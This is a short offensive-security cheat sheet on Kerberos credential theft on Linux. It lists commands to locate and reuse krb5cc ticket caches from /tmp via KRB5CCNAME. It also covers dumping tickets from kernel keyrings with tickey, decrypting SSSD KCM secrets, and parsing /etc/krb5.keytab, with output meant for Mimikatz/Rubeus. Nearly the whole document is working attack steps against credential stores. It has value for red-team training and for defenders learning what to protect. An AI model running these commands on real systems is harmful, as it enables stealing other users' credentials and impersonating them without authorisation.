# CCACHE Ticket reuse 

### When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions

### List the current ticket used for authentication with env | grep KRB5CCNAME . The format is portable and the ticket can be reused by setting the environment variable with export KRB5CCNAME=/tmp/ticket.ccache . Kerberos ticket name format is krb5cc_%{uid} where uid is the user UID.

## From /tmp

 - ls /tmp/ | grep krb5cc

 - export KRB5CCNAME=/tmp/krb5cc_1569901115

## From keyring

### Tool to extract Kerberos tickets from Linux kernel keys: https://github.com/TarlogicSecurity/tickey

#### 1) Configuration and build

 - git clone https://github.com/TarlogicSecurity/tickey

 - cd tickey/tickey

 - make CONF=Release

 - /tmp/tickey -i

## From SSSD KCM

### SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb . The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey . By default, the key is only readable if you have root permissions.

### Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets.

 - git clone https://github.com/mandiant/SSSDKCMExtractor

 - python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey

### The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.

## From keytab

 - git clone https://github.com/its-a-feature/KeytabParser

 - python KeytabParser.py /etc/krb5.keytab

 - klist -k /etc/krb5.keytab
